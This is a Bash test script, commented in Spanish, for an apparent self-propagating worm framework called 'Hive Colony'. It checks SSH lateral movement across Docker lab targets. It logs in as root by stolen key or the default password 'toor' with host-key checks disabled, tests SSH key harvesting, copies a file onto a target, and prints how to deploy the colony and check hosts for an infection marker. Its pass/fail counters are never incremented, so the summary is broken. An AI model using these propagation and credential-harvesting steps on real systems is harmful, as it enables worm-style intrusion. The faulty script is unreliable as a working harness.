#!/usr/bin/env bash
# Hive Colony v3.0 — Prueba de propagación SSH
# Verifica que Drone/Swarm pueden moverse lateralmente vía SSH
set -euo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
pass() { echo -e "  ${GREEN}PASS${NC}: $*"; }
fail() { echo -e "  ${RED}FAIL${NC}: $*"; }
info() { echo -e "${CYAN}[*]${NC} $*"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $*"; }

PASS=0
FAIL=0
LAB_DIR="$(dirname "$0")/../docker/lab"
COMPOSE="docker compose -f ${LAB_DIR}/docker-compose.lab.yml"
SSH_KEY="/tmp/hive_lab_keys/id_ed25519"

echo "╔══════════════════════════════════════════════╗"
echo "║   PRUEBA DE PROPAGACIÓN SSH                  ║"
echo "╚══════════════════════════════════════════════╝"
echo ""

# 1. Verificar que los targets existen
info "Test 1: Targets SSH accesibles..."
TARGETS=()
for name in hive-target-web hive-target-db hive-target-backup; do
    IP=$(docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' "$name" 2>/dev/null)
    if [ -n "$IP" ] && nc -z -w3 "$IP" 22 2>/dev/null; then
        pass "${name} reachable on ${IP}:22"
        TARGETS+=("$IP")
    else
        fail "${name} not reachable"
    fi
done

# 2. Verificar SSH con clave
info "Test 2: Autenticación SSH con clave..."
for ip in "${TARGETS[@]}"; do
    if ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes \
           -i "$SSH_KEY" "root@${ip}" "hostname" 2>/dev/null; then
        pass "SSH key auth to ${ip} OK"
    else
        # Fallback: password auth
        if sshpass -p toor ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
                   "root@${ip}" "hostname" 2>/dev/null; then
            pass "SSH password auth to ${ip} OK"
        else
            fail "SSH auth to ${ip} FAILED"
        fi
    fi
done

# 3. Verificar que los agentes pueden descubrir los targets
info "Test 3: Descubrimiento de hosts..."
# El Swarm usa discover_hosts() que escanea la red local
# Verificamos que los targets son reachables desde el contenedor swarm
SWARM_CONTAINER=$(docker ps -q -f name=hive-swarm 2>/dev/null || true)
if [ -n "$SWARM_CONTAINER" ]; then
    for ip in "${TARGETS[@]}"; do
        if docker exec "$SWARM_CONTAINER" ping -c1 -W2 "$ip" >/dev/null 2>&1; then
            pass "Swarm puede alcanzar ${ip}"
        else
            warn "Swarm no puede alcanzar ${ip} (esperable si swarm no está corriendo)"
        fi
    done
else
    warn "Swarm container no está corriendo — test de descubrimiento skip"
fi

# 4. Verificar que Leech puede harvestear claves SSH
info "Test 4: Harvesting de claves SSH..."
# El Leech busca en ~/.ssh/ y /root/.ssh/
if [ -f ~/.ssh/id_ed25519 ]; then
    pass "Clave SSH disponible para Leech en ~/.ssh/"
else
    warn "No hay clave en ~/.ssh/ — Leech no encontrará claves locales"
fi

# 5. Probar exec_ssh (usado por Swarm para SCP deploy)
info "Test 5: exec_ssh (SCP deploy)..."
if [ ${#TARGETS[@]} -gt 0 ]; then
    FIRST_TARGET="${TARGETS[0]}"
    # Probar que podemos copiar un archivo via SSH
    echo "test" | ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
        -i "$SSH_KEY" "root@${FIRST_TARGET}" "cat > /tmp/hive_test && echo OK" 2>/dev/null && \
        pass "SCP-like deploy a ${FIRST_TARGET} funciona" || \
        fail "SCP-like deploy a ${FIRST_TARGET} falló"
fi

# 6. Verificar Ollama (si está disponible)
info "Test 6: Ollama LLM..."
OLLAMA_IP=$(docker inspect -f '{{range.NetworkSettings.Networks}}{{.IPAddress}}{{end}}' hive-ollama 2>/dev/null || echo "")
if [ -n "$OLLAMA_IP" ] && curl -sf "http://${OLLAMA_IP}:11434/api/tags" > /dev/null 2>&1; then
    pass "Ollama reachable en ${OLLAMA_IP}:11434"
    # Verificar modelo tinyllama
    if curl -sf "http://${OLLAMA_IP}:11434/api/tags" 2>/dev/null | grep -q "tinyllama"; then
        pass "Modelo tinyllama disponible"
    else
        warn "Modelo tinyllama no descargado aún"
    fi
else
    warn "Ollama no accesible"
fi

# Resumen
echo ""
echo "╔══════════════════════════════════════════════╗"
echo "║   RESULTADOS                                 ║"
echo "╠══════════════════════════════════════════════╣"
TOTAL=$((PASS + FAIL))
echo "║  PASS: ${PASS}   FAIL: ${FAIL}   TOTAL: ${TOTAL}"
echo "╚══════════════════════════════════════════════╝"
echo ""
echo "Para desplegar la colonia completa:"
echo "  ${COMPOSE} up -d"
echo ""
echo "Para monitorear propagación:"
echo "  docker logs -f hive-swarm"
echo "  docker logs -f hive-drone"
echo ""
echo "Para verificar targets infectados:"
echo "  for t in hive-target-web hive-target-db hive-target-backup; do"
echo '    echo "$t: $(docker exec $t ls /dev/shm/.w 2>/dev/null || echo not infected)"'
echo "  done"
